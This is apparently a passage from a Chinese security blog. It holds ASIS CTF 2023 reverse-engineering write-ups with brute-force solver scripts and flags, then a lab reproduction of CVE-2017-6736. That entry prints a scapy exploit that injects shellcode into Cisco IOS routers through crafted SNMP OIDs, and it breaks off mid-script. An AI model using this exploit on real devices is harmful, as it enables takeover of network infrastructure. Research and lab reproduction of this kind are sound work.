<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Salsa20</span><br><span class="line"></span><br><span class="line"><span class="comment"># Salsa20</span></span><br><span class="line">key = <span class="string">b&#x27;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#x27;</span></span><br><span class="line">nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;</span></span><br><span class="line">cipher = Salsa20.new(key=key , nonce=nonce)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = [  <span class="number">0xFA</span>, <span class="number">0xCD</span>, <span class="number">0xCD</span>, <span class="number">0x92</span>, <span class="number">0xEE</span>, <span class="number">0x7E</span>, <span class="number">0xE6</span>, <span class="number">0xB7</span>, <span class="number">0x5A</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0x63</span>, <span class="number">0xFD</span>, <span class="number">0x23</span>, <span class="number">0xA9</span>, <span class="number">0xAE</span>, <span class="number">0x20</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0xEB</span>, <span class="number">0xFD</span>, <span class="number">0x6D</span>, <span class="number">0x36</span>, <span class="number">0x53</span>, <span class="number">0x0E</span>, <span class="number">0x39</span>, <span class="number">0xC6</span>, <span class="number">0x7C</span>,</span><br><span class="line">  <span class="number">0xA4</span>, <span class="number">0xB3</span>, <span class="number">0xC5</span>, <span class="number">0x63</span>, <span class="number">0xA3</span>, <span class="number">0xD9</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0xFB</span>, <span class="number">0x65</span>,</span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0xF5</span>, <span class="number">0x5F</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x6C</span>, <span class="number">0xE8</span>,</span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xEF</span>, <span class="number">0xC3</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0x75</span>, <span class="number">0xAF</span>, <span class="number">0x70</span>, <span class="number">0x4D</span>, <span class="number">0x70</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xD1</span>, <span class="number">0x36</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(a[i],<span class="number">16</span>) ^ b[i]),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>发现 <code>chacha20</code>  得到的是 2 个 * 16 组的随机数，故而确定这里是 <code>chacha20+随机数</code> 的流加密魔改</p>
<p>除此之外，还有几个 <code>xor</code>  操作，比较好逆，结合看一下最后的输出，就有整个流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入32位的flag和若干位的pass（32位）</span><br><span class="line"></span><br><span class="line">flag = flag ^ pass</span><br><span class="line"></span><br><span class="line">tmp = chacha20(key = flag, plaintext = pass, nonce = b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;)</span><br><span class="line"></span><br><span class="line">cybertext1 = flag ^ random1 # random2也是两个随机数重复16次</span><br><span class="line"></span><br><span class="line">cybertext2 = tmp ^ random2 # random1是两个随机数重复16次</span><br><span class="line"></span><br><span class="line">output = hex_dump(cybertext1 + cybertext2)</span><br></pre></td></tr></table></figure>
<p>解密时需要爆破四个随机数…0xff ^ 4 的解空间，这里用的是 python 硬爆，需要 12 小时</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924091010562.png" alt="image-20230924091010562"></p>
<p>毕竟不是冲分比赛，如果是的话可以到此找台队里好的电脑或者服务开爆（×）</p>
<p>不过自己做可以想想优化，可以看到 <code>pass</code>  全程都是被流加密的，原理上只做了单位异或</p>
<p>也就是说可以少爆一个 random 值，爆破两次，分别拿到 flag 的奇偶位，这样就是  <code>0xff ^ 3 * 2</code>  的解空间，而 <code>0xff ^ 3</code>  大概是四分钟左右</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924091433563.png" alt="image-20230924091433563"> 再做一点细微优化，可以缩减到两分半钟每次，那么总的单次爆破时间就缩减到了六分钟，调试和 debug 变得基本可行（本身流程比较复杂确实也没有一次写对，犯低级错误浪费时间了)</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924091828715.png" alt="image-20230924091828715"></p>
<p>然后大概优化一下判断匹配标准，并且把奇偶位拼接上，基本上就是最后脚本了（个人还是觉得这里的一步步想法推进挺有意思的，就是 debug 过程很痛苦，每调一次就得在一堆乱七八糟的玩意里找乱七八糟的 flag，这里把 ASIS {的标志位留下来感觉体验会好很多…）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cybertext1 = <span class="string">&#x27;e5be2ec5c9d2c1532abbbd7a907217a2fd078f46b102817d062124b0b02a5de9&#x27;</span></span><br><span class="line">cybertext2 = <span class="string">&#x27;dcc3955c839144d7115f093c7fc198107779920a2c1b6ba2ae44b372849e6187&#x27;</span></span><br><span class="line"></span><br><span class="line">cybertext1_ori = [<span class="built_in">int</span>(cybertext1[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cybertext1), <span class="number">2</span>)]</span><br><span class="line">cybertext2_ori = [<span class="built_in">int</span>(cybertext2[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cybertext2), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">cybertext1 = [<span class="built_in">int</span>(cybertext1[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cybertext1), <span class="number">2</span>)]</span><br><span class="line">cybertext2 = [<span class="built_in">int</span>(cybertext2[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cybertext2), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cybertext1)</span><br><span class="line"><span class="built_in">print</span>(cybertext2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">total_iterations = (<span class="number">0xff</span>+<span class="number">1</span>) * (<span class="number">0xff</span>+<span class="number">1</span>) * (<span class="number">0xff</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag_list_odd = []</span><br><span class="line">flag_list_even = []</span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./forceOdd.bin&#x27;</span>,<span class="string">&#x27;ab&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">with</span> tqdm(total=total_iterations) <span class="keyword">as</span> pbar:</span><br><span class="line">        <span class="keyword">for</span> random1_1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> random1_2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cybertext1)):</span><br><span class="line">                    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                        cybertext1[i] = cybertext1_ori[i] ^ random1_1</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        cybertext1[i] = cybertext1_ori[i] ^ random1_2</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> random2_1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> random2_2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cybertext2)):</span><br><span class="line">                            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                                cybertext2[i] = cybertext2_ori[i] ^ random2_1</span><br><span class="line">                            <span class="keyword">else</span> :</span><br><span class="line">                                cybertext2[i] = cybertext2_ori[i] ^ random2_2</span><br><span class="line"></span><br><span class="line">                        key = <span class="built_in">bytes</span>(cybertext2)</span><br><span class="line">                        cybertext = <span class="built_in">bytes</span>(cybertext1)</span><br><span class="line">                        nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">                        cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">                        plain = cipher.encrypt(cybertext)</span><br><span class="line">                        plain = <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(plain, key)])</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">33</span> &lt;= <span class="built_in">int</span>(plain[i]) &lt;= <span class="number">126</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain), <span class="number">2</span>)):</span><br><span class="line">                            modified_plain = <span class="built_in">bytearray</span>([plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain), <span class="number">2</span>)])  <span class="comment"># 创建一个可变的字节数组</span></span><br><span class="line">                            file.write(<span class="built_in">bytes</span>(modified_plain) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">                            flag_list_odd.append(<span class="built_in">bytes</span>(modified_plain) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">                        pbar.update(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./forceEven.bin&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">with</span> tqdm(total=total_iterations) <span class="keyword">as</span> pbar:</span><br><span class="line">        <span class="keyword">for</span> random1_1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> random1_2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cybertext1)):</span><br><span class="line">                    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                        cybertext1[i] = cybertext1_ori[i] ^ random1_1</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        cybertext1[i] = cybertext1_ori[i] ^ random1_2</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> random2_1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> random2_2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cybertext2)):</span><br><span class="line">                            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                                cybertext2[i] = cybertext2_ori[i] ^ random2_1</span><br><span class="line">                            <span class="keyword">else</span> :</span><br><span class="line">                                cybertext2[i] = cybertext2_ori[i] ^ random2_2</span><br><span class="line"></span><br><span class="line">                        key = <span class="built_in">bytes</span>(cybertext2)</span><br><span class="line">                        cybertext = <span class="built_in">bytes</span>(cybertext1)</span><br><span class="line">                        nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">                        cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">                        plain = cipher.encrypt(cybertext)</span><br><span class="line">                        plain = <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(plain, key)])</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">33</span> &lt;= <span class="built_in">int</span>(plain[i]) &lt;= <span class="number">126</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">2</span>)):</span><br><span class="line">                            modified_plain = <span class="built_in">bytearray</span>([plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">2</span>)])</span><br><span class="line">                            file.write(<span class="built_in">bytes</span>(modified_plain) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">                            flag_list_even.append(<span class="built_in">bytes</span>(modified_plain) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">                        pbar.update(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> odd <span class="keyword">in</span> flag_list_odd:</span><br><span class="line">    <span class="keyword">for</span> even <span class="keyword">in</span> flag_list_even:</span><br><span class="line">        tmp_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(odd, even):</span><br><span class="line">            tmp_flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            tmp_flag += <span class="built_in">chr</span>(i)</span><br><span class="line">        flag_list.append(tmp_flag)</span><br><span class="line"><span class="built_in">print</span>(flag_list)</span><br></pre></td></tr></table></figure>
<p>这里最后的版本需要肉眼在六百多条里面找真 flag，应该算目前我能想的最优的爆破了，大概效果如下（还是相当精神污染的，可能是自己题做少了也说不准…）：</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924092335126.png" alt="image-20230924092335126"></p>
<p>（后话：结果是 python 本身 Crypto 库的瓶颈，导致需要这样优化，其他师傅自己 cpp 写的满 0xff ^ 4 空间的爆破也就十几分钟左右，同样空间下 python 就得十几个小时了…）</p>
<h3 id="scrat"><a class="markdownIt-Anchor" href="#scrat">#</a> scrat</h3>
<p>这个题其实和 sid 差不多，也是麻烦的加密和爆破（解数比 sid 多的原因完全可能是很多师傅和我一开始一样 sid 爆出来了但是没看见 flag）</p>
<p>yysy，算是练习调试、 <code>cpp string</code>  导致的一些奇怪的汇编代码、猜测能力吧，新东西确实没有啥了</p>
<p>几处加密：</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230925191134745.png" alt="image-20230925191134745"></p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230925191920010.png" alt="image-20230925191920010"></p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230925191831529.png" alt="image-20230925191831529"></p>
<p>流程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tmp = flag[i] * (<span class="number">39</span> + <span class="number">1</span> - i)</span><br><span class="line">s = <span class="built_in">sum</span>(flag)</span><br><span class="line">s = (s + (-<span class="number">1</span>) ^ (i) * tmp) % <span class="number">0x4141a15b</span></span><br><span class="line">s = s * <span class="number">39</span> % <span class="number">0x4141a15b</span></span><br><span class="line">seed = <span class="number">1</span></span><br><span class="line">v33 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> s &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        seed = v33 * seed % <span class="number">0x4141A15B</span></span><br><span class="line">    v33 = v33 * v33 % <span class="number">0x4141A15B</span></span><br><span class="line">    s &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    seed = seed * <span class="number">166013</span> + <span class="number">4148159</span></span><br><span class="line">    flag[i] ^= (seed // <span class="number">0x10000</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>
<p><a href="http://exp.py">exp.py</a> (比赛结束了抄个 JANlittle 师傅的，感觉基本功确实还缺点 qaq)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;3a392465ffefc6b485193c32cefdb99df95cb6d6566478a17873b92b2df5dea31e5c0edbb1cc9b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000000</span>):</span><br><span class="line">    seed = <span class="number">1</span></span><br><span class="line">    v33 = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> s != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> s &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">            seed = v33 * seed % <span class="number">0x4141A15B</span></span><br><span class="line">        v33 = v33 * v33 % <span class="number">0x4141A15B</span></span><br><span class="line">        s &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    t = <span class="built_in">list</span>(enc)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">        seed = seed * <span class="number">166013</span> + <span class="number">4148159</span></span><br><span class="line">        t[i] ^= (seed // <span class="number">0x10000</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">bytes</span>(t).startswith(<span class="string">b&#x27;ASIS&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>(t).startswith(<span class="string">b&#x27;ASIS&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ASIS&#123;___A_9!Rl_w1Th_Dr4G0N_7AtTO5___!!&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-6736</title>
    <url>/2024/01/24/CVE-2017-6736/</url>
    <content><![CDATA[<h6 id="preface偷点纯真的理解"><a class="markdownIt-Anchor" href="#preface偷点纯真的理解">#</a> PREFACE：偷点纯真的理解</h6>
<span id="more"></span>
<h3 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置">#</a> 环境配置</h3>
<p>docker 环境 (ubuntu 15)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:wily</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker run --cap-add=NET_ADMIN --device=/dev/net/tun  -it ubuntu:wily /bin/bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install git</span><br></pre></td></tr></table></figure>
<p>换源到旧版 ubuntu：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/archive/old-releases/g&#x27; /etc/apt/sources.list</span><br><span class="line">apt update</span><br></pre></td></tr></table></figure>
<p>编译模拟环境 dynamips</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">git clone https://github.com/Groundworkstech/dynamips-gdb-mod.git</span><br><span class="line"></span><br><span class="line">cd dynamips-gdb-mod/src</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">apt-get install libpcap-dev uml-utilities libelf-dev libelf1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里需要修改配置文件</span></span><br><span class="line">cd /</span><br><span class="line">find . -name &quot;libelf.a&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./usr/lib/x86_64-linux-gnu/libelf.a</span></span><br><span class="line">vim Makefile</span><br></pre></td></tr></table></figure>
<img loading="lazy" data-src="CVE-2017-6736/image-20240124172328534.png" alt="image-20240124172328534" style="zoom:50%;">
<img loading="lazy" data-src="CVE-2017-6736/image-20240125085212819.png" alt="image-20240125085212819" style="zoom:50%;">
<img loading="lazy" data-src="CVE-2017-6736/image-20240125085538393.png" alt="image-20240125085538393" style="zoom:50%;">
<p>配置网络</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tunctl -t tap1 # 创建网络接口</span><br><span class="line">ifconfig tap1 up # 配置启用网络接口</span><br><span class="line">ifconfig tap1 192.168.199.139/24 up # 指定给tap1的IP地址和子网掩码</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除</span></span><br><span class="line">ifconfig tap1 down</span><br><span class="line">tunctl -d tap1</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="CVE-2017-6736/image-20240125092852258.png" alt="image-20240125092852258"></p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dynamips -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN</span><br></pre></td></tr></table></figure>
<p>开启 gdb server 调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dynamips -Z 12345 -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN</span><br></pre></td></tr></table></figure>
<p>配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Would you like to enter the initial configuration dialog? [yes/no]:yes</span><br><span class="line">management network from the above interface summary: Ethernet0/0</span><br><span class="line">ip address 192.168.199.138 255.255.255.0</span><br></pre></td></tr></table></figure>
<p>重新配置方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm c2600_*</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.199.254 public 12345678</span><br></pre></td></tr></table></figure>
<p><a href="http://c2800nm-adventerprisek9-mz.151-4.M12a.py">c2800nm-adventerprisek9-mz.151-4.M12a.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  cs = <span class="built_in">__import__</span>(<span class="string">&#x27;capstone&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2oid</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(unpack(<span class="string">&#x27;B&#x27;</span>,x)[<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> buf])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">s, offset</span>):</span><br><span class="line">    res = pack(<span class="string">&#x27;&gt;I&#x27;</span>, unpack(<span class="string">&#x27;&gt;I&#x27;</span>, s)[<span class="number">0</span>] + offset)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alps_oid = <span class="string">&#x27;1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125;&#123;7&#125;.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50&#123;8&#125;&#123;9&#125;.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115&#123;10&#125;&#123;11&#125;.11.187.147.166.116.171.114.126.109.248.144.111.30&#x27;</span></span><br><span class="line">shellcode_start = <span class="string">&#x27;\x80\x00\xf0\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;host IP&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;community&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;community string&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;shellcode&quot;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;shellcode to run (in hex)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh_buf = args.shellcode.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Writing shellcode to 0x&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(shellcode_start.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;capstone&#x27;</span> <span class="keyword">in</span> sys.modules: </span><br><span class="line">        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k, sh_dword <span class="keyword">in</span> <span class="built_in">enumerate</span>([sh_buf[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(sh_buf), <span class="number">4</span>)]):</span><br><span class="line">        s0 = bin2oid(sh_dword)  <span class="comment"># shellcode dword</span></span><br><span class="line">        s1 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>) </span><br><span class="line">        s2 = bin2oid(<span class="string">&#x27;\xBF\xC5\xB7\xDC&#x27;</span>)</span><br><span class="line">        s3 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        s4 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        s5 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        s6 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        ra = bin2oid(<span class="string">&#x27;\xbf\xc2\x2f\x60&#x27;</span>) <span class="comment"># return control flow jumping over 1 stack frame</span></span><br><span class="line">        s0_2 = bin2oid(shift(shellcode_start, k * <span class="number">4</span>))</span><br><span class="line">        ra_2 = bin2oid(<span class="string">&#x27;\xbf\xc7\x08\x60&#x27;</span>)</span><br><span class="line">        s0_3 = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        ra_3 = bin2oid(<span class="string">&#x27;\xBF\xC3\x86\xA0&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = alps_oid.<span class="built_in">format</span>(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)</span><br><span class="line">        </span><br><span class="line">        send(IP(dst=args.host)/UDP(sport=<span class="number">161</span>,dport=<span class="number">161</span>)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))</span><br><span class="line"></span><br><span class="line">        cur_addr = unpack(<span class="string">&quot;&gt;I&quot;</span>,shift(shellcode_start, k * <span class="number">4</span> + <span class="number">0xa4</span>))[<span class="number">0</span>]</span><br><span class="line">  